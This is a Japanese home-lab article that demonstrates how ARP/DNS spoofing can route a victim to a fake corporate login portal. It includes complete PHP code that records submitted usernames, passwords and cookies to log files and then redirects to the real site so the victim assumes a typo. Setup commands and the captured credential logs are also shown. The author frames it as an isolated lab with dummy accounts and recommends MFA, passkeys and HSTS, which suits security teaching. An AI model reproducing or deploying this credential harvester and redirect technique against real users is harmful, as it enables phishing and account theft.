---
title: "【自宅ラボ検証】ARP/DNSスプーフィングから偽装Webサイトを使って認証情報を搾取する"
date: 2026-09-19
tags: ["vulnerability", "偽装", "Web", "フィッシング", "Security", "KaliLinux"]
source: "https://qiita.com/ohtsuka-shota/items/b46ebb705e2f82b72f9a"
---
# はじめに
:::note warn
警告
本記事では、ARPスプーフィングおよびDNSスプーフィングによって、利用者を偽装Webサイトへ誘導する仕組みを、自宅ラボ内の隔離された検証環境で確認します。

検証対象は、筆者が所有・管理する仮想マシンおよびネットワークに限定しています。第三者が管理する端末、ネットワーク、Webサイトなどに対して同様の行為を行うことは、不正アクセス禁止法などの法令に抵触する可能性があります。

また、記事中で扱う認証情報は、検証用に作成したダミーアカウントのみを使用しています。実際のサービスで使用しているユーザー名、パスワード、Cookie、アクセストークンなどは、絶対に入力しないでください。

本記事の目的は攻撃を推奨することではなく、以下の内容を理解することです。

ARPスプーフィングやDNSスプーフィングによって通信経路が改変される仕組み
偽装Webサイトに誘導された場合に発生するリスク
利用者が確認すべき不審な兆候
HTTPS、HSTS、多要素認証、ネットワーク監視などの防御策の重要性
:::

本記事は以下の記事で行ったARP/DNSスプーフィング環境を作った後に追加で検証した内容になります。

[[cyber-kill-chain-mitm-bettercap-dns-spoofing]]

## サイバーキルチェーンで見る本記事の位置づけ

今回の内容をサイバーキルチェーンの7段階に当てはめると、以下のように整理できます。

| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ③ 配送（Delivery） | 攻撃者が標的の通信経路へ介入する | ARPスプーフィングにより、標的とデフォルトゲートウェイ間の通信を攻撃者経由の中間者経路へ誘導する |
| ④ 脆弱性の悪用（Exploitation） | ネットワークプロトコルや名前解決の信頼性を悪用する | DNSスプーフィングにより、正規ドメインへのDNSクエリに対して、攻撃者が管理するIPアドレスを含む偽の応答を返す |
| ⑦ 目的の実行（Actions on Objectives） | 利用者を偽装サイトへ誘導し、攻撃者の目的を達成する | 標的が正規サイトだと思って偽装サイトへアクセスし、検証用フォームへ入力する|

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)


# 偽装サーバの挙動パターン
偽装Webサーバは、入力された内容を受け取った後の挙動によって、いくつかのパターンに分類できます。
本記事では、その中でも検証しやすい「認証情報を記録した後、正規サイトへリダイレクトするパターン」を扱います。

| パターン | 偽装サーバの挙動 | 目的・特徴 |
| --- | --- | --- |
| **正規サイトへリダイレクト** | 資格情報を記録後、正規URLへリダイレクト（再度ログインを要求） | 被害者に「タイプミスで失敗した」と錯覚させ、2回目で正常ログインさせることで発覚を遅らせる。 |
| **リバースプロキシ型（中間者）** | 攻撃者が正規サイトと通信を中継（プロキシ）し、正規のログイン後画面をそのまま返す | 被害者は正常にログインできたと思い込み、二要素認証（OTP）やセッション情報までリアルタイムに窃取される。 |
| **偽のエラー・メンテナンス表示** | 「パスワードが間違っています」「メンテナンス中」などの偽エラーを表示 | 被害者が疑問を持たず離脱するのを待つ手法。 |
| **ダミーのダッシュボード表示** | 偽装した簡易マイページなどを表示 | 特定の閉域網や単機能サイトで、短期間情報を抜き取る場合に使われる。 |


# 環境構成
## 全体構成
緑が正規通信フロー、赤がスプーフィングの結果行われる偽装通信フローになります。
今回は正規/偽装Webサーバで公開されているページが認証情報を求められるページだった時に、どのように認証情報が不正に取得されるか、その環境を簡易的ですが作ってみたいと思います。
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img01.png)

# 環境構築
## 正規Webサイトの整備
前回ARP/DNSスプーフィングでユーザの正規Webサイトへのアクセスを偽装サイトに引き込みましたが、例えば正規Webサイトが認証情報を使う系のサイト（一般的なログインして何かをするサービス）である場合認証情報を搾取される可能性があります。

まず正規Webサイトをその仕様にします。
PHPをインストールします。
```
root@www:~# apt update && apt upgrade -y
root@www:~# apt install -y php
root@www:~# php -v
PHP 8.3.6 (cli) (built: Sep  2 2026 12:56:02) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.3.6, Copyright (c) Zend Technologies
    with Zend OPcache v8.3.6, Copyright (c), by Zend Technologies
```

topページであるindex.htmlを書き換えます。
```
root@www:~# cp -p /var/www/html/index.html index.html.20260919
root@www:~# nano /var/www/html/index.html
root@www:~# cat /var/www/html/index.html
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>社内ポータル - ログイン</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #F6F1E8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background: #FFFFFF;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(42, 39, 35, 0.08);
            width: 100%;
            max-width: 440px;
            padding: 48px 40px;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo-icon {
            width: 56px;
            height: 56px;
            background: #2A2723;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin-bottom: 16px;
        }

        h1 {
            font-family: 'DM Serif Display', Georgia, serif;
            font-size: 28px;
            font-weight: 700;
            color: #1F2421;
            text-align: center;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #8A8A80;
            font-size: 14px;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1F2421;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1.5px solid #E2D9C8;
            border-radius: 8px;
            font-size: 15px;
            color: #1F2421;
            background: #FBF7EF;
            transition: all 0.2s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #C8853F;
            background: #FFFFFF;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #1F2421;
        }

        .remember-me input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .forgot-link {
            color: #C8853F;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link:hover {
            color: #A86B2C;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            background: #C8853F;
            color: #FFFFFF;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .login-button:hover {
            background: #A86B2C;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(200, 133, 63, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 13px;
            color: #8A8A80;
        }

        .footer a {
            color: #C8853F;
            text-decoration: none;
        }

        .status-badge {
            display: inline-block;
            background: #F0E3D0;
            color: #A86B2C;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 24px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <div class="logo-icon">🏢</div>
            <div class="status-badge">セキュアアクセス</div>
        </div>

        <h1>社内ポータル</h1>
        <p class="subtitle">アカウント情報を入力してください</p>

        <form action="login.php" method="POST">
            <div class="form-group">
                <label for="username">ユーザー名</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>

            <div class="form-group">
                <label for="password">パスワード</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" name="remember">
                    <span>ログイン状態を保持</span>
                </label>
                <a href="#" class="forgot-link">パスワードをお忘れですか？</a>
            </div>

            <button type="submit" class="login-button">ログイン</button>
        </form>

        <div class="footer">
            アカウントをお持ちでない方は <a href="#">管理者に連絡</a>
        </div>
    </div>
</body>
</html>
```

login.phpを作成します。
```
root@www:~# nano /var/www/html/login.php
root@www:~# cat /var/www/html/login.php
<?php
// 認証情報を記録
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// ログファイルに記録
$log_entry = "[{$timestamp}] IP: {$ip} | Username: {$username} | Password: {$password} | User-Agent: {$user_agent}\n";
file_put_contents('/var/log/lab-web/phishing.log', $log_entry, FILE_APPEND | LOCK_EX);

// Cookieも記録
$cookies = json_encode($_COOKIE);
$cookie_entry = "[{$timestamp}] IP: {$ip} | Cookies: {$cookies}\n";
file_put_contents('/var/log/lab-web/cookies.log', $cookie_entry, FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">	
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ダッシュボード - 社内ポータル</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #F6F1E8;
            padding: 0;
        }
        
        .header {
            background: #2A2723;
            color: #FFFFFF;
            padding: 20px 32px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .welcome {
            font-size: 18px;
            font-weight: 500;
        }
        
        .username {
            color: #C8853F;
            font-weight: 600;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 32px auto;
            padding: 0 24px;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 24px;
        }
        
        .card {
            background: #FFFFFF;
            padding: 28px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(42, 39, 35, 0.08);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        
        .card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(42, 39, 35, 0.12);
        }
        
        .card-icon {
            font-size: 32px;
            margin-bottom: 16px;
        }
        
        .card h3 {
            font-family: 'DM Serif Display', Georgia, serif;
            font-size: 20px;
            font-weight: 600;
            color: #1F2421;
            margin-bottom: 8px;
        }
        
        .card p {
            color: #8A8A80;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .badge {
            display: inline-block;
            background: #F0E3D0;
            color: #A86B2C;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 600;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="welcome">
            ようこそ、<span class="username"><?php echo htmlspecialchars($username); ?></span> さん
        </div>
        <div class="logo-section">
            <span>🏢</span>
            <span>社内ポータル</span>
        </div>
    </div>
    
    <div class="container">
        <div class="dashboard">
            <div class="card">
                <div class="card-icon">📧</div>
                <h3>メール</h3>
                <p>最新のメッセージを確認できます</p>
                <span class="badge">未読 5件</span>
            </div>
            
            <div class="card">
                <div class="card-icon">📁</div>
                <h3>ドキュメント</h3>
                <p>共有ファイルとフォルダ</p>
                <span class="badge">更新 3件</span>
            </div>
            
            <div class="card">
                <div class="card-icon">📊</div>
                <h3>レポート</h3>
                <p>月次レポートと分析資料</p>
                <span class="badge">新着 2件</span>
            </div>
            
            <div class="card">
                <div class="card-icon">⚙️</div>
                <h3>設定</h3>
                <p>アカウント設定とセキュリティ</p>
            </div>
            
            <div class="card">
                <div class="card-icon">👥</div>
                <h3>チーム</h3>
                <p>メンバー一覧とディレクトリ</p>
            </div>
            
            <div class="card">
                <div class="card-icon">📅</div>
                <h3>カレンダー</h3>
                <p>スケジュールと予定管理</p>
                <span class="badge">今日 4件</span>
            </div>
        </div>
    </div>
</body>
</html>
```

index.htmlとlogin.phpの権限・所有者周りを整理します。
また、これらページで使用するlogファイルも作成しておきます。
```
root@www:~# chmod 644 /var/www/html/index.html
root@www:~# chmod 644 /var/www/html/login.php
root@www:~# mkdir -p /var/log/lab-web
root@www:~# touch /var/log/lab-web/phishing.log
root@www:~# touch /var/log/lab-web/cookies.log
root@www:~# chown -R www-data:www-data /var/log/lab-web
root@www:~# chmod 750 /var/log/lab-web
root@www:~# chmod 640 /var/log/lab-web/*.log
root@www:~# systemctl restart apache2
```

この状態でARP/DNSスプーフィングの被害にあっていないPC想定のVMから正規Webサイトにアクセスします。
ユーザ名/パスワードをtest/passwordとします。
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img02.png)

ログイン出来ました
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img03.png)

この時正規Webサーバのログにユーザ名とパスワードが記載されています。
※本来であればlogに暗号化をされない状態で保存されることは無いとは思いますが。
```
root@www:~# cat /var/log/lab-web/phishing.log
[2026-09-19 11:33:50] IP: 192.168.0.60 | Username: test | Password: password | User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
root@www:~# cat /var/log/lab-web/cookies.log
[2026-09-19 11:33:50] IP: 192.168.0.60 | Cookies: []
```

## 偽装Webサイトの整備
スプーフィング攻撃成功時に「偽装サイトへ到達したこと」を視覚的に判別できるよう、画面上部に警告バナーを追加し、デザイン色や文言を一部変更したダミーページを配置します。
※本来の攻撃であればそのようなことはしないでしょうが今回は検証なので。

まずはトップページであるindex.htmlです。
```
# cp -p /var/www/html/index.html /var/www/html/index.html.20260919
# nano /var/www/html/index.html
# cat /var/www/html/index.html
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>【DUMMY】社内ポータル - ログイン</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #F8E8E8; /* 判別用：背景を薄い赤に */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .dummy-banner {
            background: #D9534F;
            color: #FFFFFF;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
        .login-container {
            background: #FFFFFF;
            border-radius: 12px;
            border: 2px solid #D9534F; /* 判別用：枠線を追加 */
            box-shadow: 0 4px 24px rgba(42, 39, 35, 0.08);
            width: 100%;
            max-width: 440px;
            padding: 48px 40px;
        }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo-icon {
            width: 56px; height: 56px;
            background: #D9534F;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin-bottom: 16px;
        }
        h1 {
            font-family: Georgia, serif;
            font-size: 28px;
            font-weight: 700;
            color: #1F2421;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle { text-align: center; color: #8A8A80; font-size: 14px; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #1F2421; margin-bottom: 8px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 12px 16px;
            border: 1.5px solid #E2D9C8;
            border-radius: 8px;
            font-size: 15px;
            background: #FBF7EF;
        }
        .login-button {
            width: 100%; padding: 14px;
            background: #D9534F; /* 判別用：ボタン色を変更 */
            color: #FFFFFF;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="dummy-banner">⚠️ [検証用] 偽装Webサイト（Kali Linux）へ接続中 ⚠️</div>
    <div class="login-container">
        <div class="logo">
            <div class="logo-icon">⚠️</div>
        </div>
        <h1>社内ポータル (偽装)</h1>
        <p class="subtitle">認証情報搾取のデモ環境です</p>

        <form action="login.php" method="POST">
            <div class="form-group">
                <label for="username">ユーザー名</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">パスワード</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-button">ログイン</button>
        </form>
    </div>
</body>
</html>
```

次にlogin.phpです。
これは正規サイトと少し変えて、資格情報を記録後、正規URLへリダイレクト（再度ログインを要求）する形で作成します。このようにすることで被害者に「タイプミスで失敗した」と錯覚させ、2回目で正常ログインさせることで発覚を遅らせることを狙っています。
```
# nano /var/www/html/login.php
# cat /var/www/html/login.php
<?php
// 1. 各種リクエスト情報の取得
$username   = $_POST['username'] ?? '';
$password   = $_POST['password'] ?? '';
$ip         = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$timestamp  = date('Y-m-d H:i:s');
$cookies    = json_encode($_COOKIE, JSON_UNESCAPED_UNICODE);

// 2. 認証情報ログの出力 (/var/log/lab-web/phishing.log)
$auth_entry = "[{$timestamp}] (CAPTURED) IP: {$ip} | Username: {$username} | Password: {$password} | User-Agent: {$user_agent}\n";
file_put_contents('/var/log/lab-web/phishing.log', $auth_entry, FILE_APPEND | LOCK_EX);

// 3. Cookieログの出力 (/var/log/lab-web/cookies.log)
$cookie_entry = "[{$timestamp}] (CAPTURED) IP: {$ip} | Cookies: {$cookies}\n";
file_put_contents('/var/log/lab-web/cookies.log', $cookie_entry, FILE_APPEND | LOCK_EX);

// 4. 正規Webサーバへのリダイレクト（正規サーバのIP/URLに書き換えてください）
$legitimate_server = "http://192.168.0.54/"; 
header("Location: " . $legitimate_server);
exit;
```

Kaliにはphpをインストールしていないので、インストールします。併せてindex.htmlとlogin.phpの権限・所有者周りを整理します。
また、これらページで使用するlogファイルも作成しておきます。
```
# apt install -y php
# chmod 644 /var/www/html/index.html
# chmod 644 /var/www/html/login.php
# mkdir -p /var/log/lab-web
# touch /var/log/lab-web/phishing.log
# touch /var/log/lab-web/cookies.log
# chown -R www-data:www-data /var/log/lab-web
# chmod 750 /var/log/lab-web
# chmod 640 /var/log/lab-web/*.log
# systemctl restart apache2
```

## DNSスプーフィングの影響を受けているPCから偽装Webサイトにアクセス
偽装Webサイトにアクセスします。www.example.comで名前解決するとDNSスプーフィングで偽装され、攻撃者が用意したWebページが表示されていることがわかります。
ここにユーザ名とパスワードを入力します。
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img04.png)

すると、login.phpで記載されたように正規サイトのログイン画面にリダイレクトされます。
利用者が異常に気付けなければ「あれ、パスワード間違えたかな？」と疑うのも無理は無さそうです。（URLの欄を見るとドメインではなくIPアドレスで通信しているのもおかしいのですが、やっぱり気づくのは難しいかもしれません）
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img05.png)

このタイミングで攻撃者にはユーザ名とパスワードがログに書かれてしまいます。
この結果、偽装サイト側で入力された認証情報が第三者に知られる可能性があります。
パスワードを他のサービスでも使い回している場合、同じ認証情報を利用する別サービスにも被害が波及するおそれがあります。
そのため、パスワードの使い回しを避け、多要素認証やパスキーを利用することが重要です。
```
# cat phishing.log
[2026-09-19 12:05:17] (CAPTURED) IP: 192.168.0.62 | Username: test | Password: password | User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
# cat cookies.log 
[2026-09-19 12:05:17] (CAPTURED) IP: 192.168.0.62 | Cookies: []
```
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img06.png)

正規サイトのログイン画面でログインを実施すると、正規サイトのポータル画面が表示されます。
これは気づかない人は気づかないでしょうね・・・
![](脆弱性/arp-dns-spoofing-fake-website-credential-theft-images/img07.png)

